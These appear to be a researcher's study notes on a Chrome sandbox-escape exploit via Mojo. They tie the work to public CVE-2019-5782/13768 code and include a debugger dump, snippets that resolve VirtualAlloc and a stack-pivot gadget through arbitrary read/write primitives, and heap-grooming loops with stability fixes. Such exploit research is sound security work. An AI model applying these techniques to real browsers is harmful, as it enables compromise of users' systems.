  0:013> ? chrome_child!g_core-chrome_child
  Evaluate expression: 87130472 = 00000000`05318168
  0:013> dt chrome_child!mojo::core::Core 00007fff`9d838168
    +0x000 __VFN_table : 0x000001f6`51648f10 
    +0x008 node_controller_lock_ : base::Lock
    +0x010 node_controller_ : std::unique_ptr<mojo::core::NodeController,std::default_delete<mojo::core::NodeController> >
    +0x018 default_process_error_callback_ : base::RepeatingCallback<void (const std::basic_string<char,std::char_traits<char>,std::allocator<char> > &)>
    +0x020 handles_         : std::unique_ptr<mojo::core::HandleTable,std::default_delete<mojo::core::HandleTable> >
    +0x028 mapping_table_lock_ : base::Lock
    +0x030 mapping_table_   : std::unordered_map<void *,std::unique_ptr<mojo::core::PlatformSharedMemoryMapping,std::default_delete<mojo::core::PlatformSharedMemoryMapping> >,std::hash<void *>,std::equal_to<void *>,std::allocator<std::pair<void *const,std::unique_ptr<mojo::core::PlatformSharedMemoryMapping,std::default_delete<mojo::core::PlatformSharedMemoryMapping> > > > >
  ```

### Notes from [ZwCreatePhoton](https://github.com/ZwCreatePhoton/CVE-2019-5782_CVE-2019-13768)

- pe64.js is this imba script which basically abuses the arbitrary rw primatives to find pointers dynamically

    ```
    virtual_alloc_ptr = chrome_child.getImport('KERNEL32.dll', 'VirtualAlloc');
    virtual_protect_ptr = kernel32.getExport('VirtualProtect');
    memcpy_ptr = kernel32.getImport('ntdll.dll', 'memcpy');
    pivot_gadget_ptr = ntdll.getGadget([ ... ]);
    ```

- For multiple processes of chrome, the base addresses of dlls commonly loaded among these processes are the same

- `"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --enable-blink-features=MojoJS`

### Attempt to use Infinity bug to escape renderer

- Calling the read/write primitives alot of times breaks the primitive

  - fix: do not repair the element pointer

- Calling addrof primitive alot of times breaks the primitive

  - fix: do not corrupt map, corrupt element pointer

- If we do not repair the element pointer, exploit is unstable at `Building controllable heap in Browser process`

  - fix: set flag to be able to repair the element pointer

- ok

    ```
    for (var i = 0; i < 2*0xc88; ++i) {
        let pipe = Mojo.createDataPipe({elementNumBytes: 0x1, capacityNumBytes: 0x1000});
        let dupe = shared_memory.duplicateBufferHandle();
        pipes.push(pipe);
        dupes.push(dupe);
    }
    for (var i = 0; i < 2*0xc88; ++i) {
        let pipe_handle = get_mojo_handle_unsafe(oob, pipes[i].consumer);
        let dupe_handle = get_mojo_handle_unsafe(oob, dupes[i].handle);
        pipe_handles.add(pipe_handle);
        dupe_handles.add(dupe_handle);
    }
    ```

- Not ok

    ```
    for (var i = 0; i < 2*0xc88; ++i) {
        let pipe = Mojo.createDataPipe({elementNumBytes: 0x1, capacityNumBytes: 0x1000});
        let dupe = shared_memory.duplicateBufferHandle();
        pipes.push(pipe);
        dupes.push(dupe);
        let pipe_handle = get_mojo_handle_unsafe(oob, pipe.consumer);
        let dupe_handle = get_mojo_handle_unsafe(oob, dupe.handle);
        pipe_handles.add(pipe_handle);
        dupe_handles.add(dupe_handle);
    }
    ```

### Mojo Related

- [mojo::Core](https://chromium.googlesource.com/chromium/src/+/master/mojo/core/README.md)

### Exploit Related

- [ruan777 some chinese dude's RCA on CVE-2019-13698](https://ruan777.github.io/2021/12/17/Chrome_issue1755%E5%88%86%E6%9E%90/)

### Settings

![](./screenshots/settings.png)

- Need to have enough resources and memory in the VM for the exploit to work